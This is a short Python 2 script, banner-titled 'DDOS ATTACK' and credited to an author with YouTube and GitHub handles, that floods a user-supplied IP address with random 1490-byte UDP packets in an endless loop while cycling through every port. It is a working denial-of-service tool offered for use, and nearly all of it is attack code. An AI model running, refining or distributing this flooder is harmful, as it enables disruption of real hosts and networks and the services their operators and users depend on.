import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
print "\033[1;37m___  ___  ____ ____    ____ ___ ___ ____ ____ _  _ \n\033[1;37m|  \ |  \ |  | [__     |__|  |   |  |__| |    |_/  \n\033[1;37m|__/ |__/ |__| ___]    |  |  |   |  |  | |___ | \_ "
print
print "\033[1;37m-------------------------------------------------------"
print " \033[1;37mAuthor   : \033[1;96mCandra-Oi"
print " \033[1;37mYouTube  : \033[1;96mCANDRA-NM SUBSCRIBE NOW!!"
print " \033[1;37mGithub   : \033[4;92mgithub.com/candranovan"
print "\033[1;37m-------------------------------------------------------"
print "\033[1;96m"
ip = raw_input("IP Target : ")
port = input("Port       : ")
print "\033[1;37m[!] Loading. . ."
time.sleep(5)
os.system("clear")
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1
